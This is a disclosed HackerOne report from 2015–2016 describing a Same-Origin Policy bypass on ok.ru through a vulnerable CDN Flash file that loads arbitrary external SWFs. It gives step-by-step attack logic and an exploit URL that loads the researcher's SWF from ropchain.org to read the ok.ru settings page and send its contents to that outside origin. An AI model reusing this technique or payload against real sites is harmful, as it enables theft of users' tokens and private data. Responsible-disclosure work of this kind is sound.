---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '102234'
original_report_id: '102234'
title: Same-Origin Policy bypass on main domain - ok.ru
team_handle: ok
created_at: '2015-11-27T01:32:29.934Z'
disclosed_at: '2016-05-04T12:32:10.263Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
---

# Same-Origin Policy bypass on main domain - ok.ru

## Metadata

- HackerOne Report ID: 102234
- Weakness: 
- Program: ok
- Disclosed At: 2016-05-04T12:32:10.263Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello,

I've just found a way to bypass Same-Origin Policy mechanism using vulnerability in one of swf files on your cdn. Let me explain this in details:

1. First of all - your Crossdomain which defines from what domains Flash files can read content on ok.ru. Crossdomain file is located here - http://ok.ru/crossdomain.xml

2. We need to find some vulnerable swf file on any of domains listed in crossdomain file.

3. I've found this shiny beauty: http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf 

4.  Flashbang Tool recognized that there are two parameters needed - "vpaidSwfUrl" and "Loader"

5. Decompilation of swf shows that Security.allowDomain("*") is used - so we can interact with this Flash file from any domain. 

6. vpaidSwfUrl is not controlled at all, and it loads and executes any external SWF. So we can use our malicious one to prepare attack. 

7. Our loaded and executed SWF from st.mycdn.me domain will make request to http://ok.ru/settings , read its content and send to javascript function in attacker controled origin. 

8. Profit - attacker gained information, whitout any user interaction. Now he can steal such sensitive data as user's e-mail, csrf tokens, private messages, and so on.

Vulnerable file that loads content from ok.ru (can be viewed in browser Developer's console): http://st.mycdn.me/static/MegaPlayer/10-2-21/vpaid-js-interface.swf?vpaidSwfUrl=http://ropchain.org/poc/ok.swf?url=http://ok.ru/settings&Loader=test

Proof of Concept that loads http://ok.ru/settings page and put it as innerHTML of div element of domain that I control (ropchain.org): http://ropchain.org/poc/ok.html

I hope that everything is clear enough, but if not - please tell me, and I'll try to prepare better explaination, I'm also able to prepare video demonstration if you need one. Also if you have any other questions - feel free to ask me. 

Have a great day! 
Jakub Zoczek

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
